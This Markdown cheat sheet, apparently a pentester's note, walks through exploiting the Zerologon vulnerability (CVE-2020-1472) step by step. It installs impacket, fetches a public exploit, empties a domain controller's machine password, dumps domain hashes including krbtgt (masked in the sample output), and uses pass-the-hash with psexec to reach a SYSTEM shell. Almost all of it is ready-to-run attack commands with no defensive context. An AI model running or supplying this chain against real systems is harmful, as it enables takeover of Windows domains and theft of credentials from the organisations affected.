# Zero logon

## Install

### Remove impacket

```bash
yay -R smbmap-git crackmapexec polenum python-lsassy enum4linux
yay -R impacket
```

### Install new version impacket

```bash
cd /tmp
git clone https://github.com/SecureAuthCorp/impacket.git 
cd impacket
pip3 install . 

yay -S smbmap-git crackmapexec polenum python-lsassy enum4linux
```

### Get exploit

```bash
git clone https://github.com/dirkjanm/CVE-2020-1472.git
```

## Exploit Zero logon

Set DC password to empty:

```bash
python cve-2020-1472-exploit.py DC_NAME IP_ADDRESS
```

Dump hashes for the server:

```bash
secretsdump.py -just-dc -no-pass DOMAIN/DC_NAME\$@IP_ADDRESS
```

Output:

```raw
Administrator:500:aadxxxxxxxxxxxxxxxxxxxxxxxxxxee:221xxxxxxxxxxxxxxxxxxxxxxxxxxcbb:::
Guest:501:aadxxxxxxxxxxxxxxxxxxxxxxxxxxee:31dxxxxxxxxxxxxxxxxxxxxxxxxxx9c0:::
krbtgt:502:aadxxxxxxxxxxxxxxxxxxxxxxxxxxee:3e3xxxxxxxxxxxxxxxxxxxxxxxxxxe23:::
```

Log to the server as `Administrator` with PTH:

```bash
psexec.py -hashes aadxxxxxxxxxxxxxxxxxxxxxxxxxxee:221xxxxxxxxxxxxxxxxxxxxxxxxxxcbb Administrator@IP_ADDRESS cmd.exe
```

Result:

```batch
C:\Windows\system32> whoami
```

```text
AUTORITE NT\SYSTEM
```
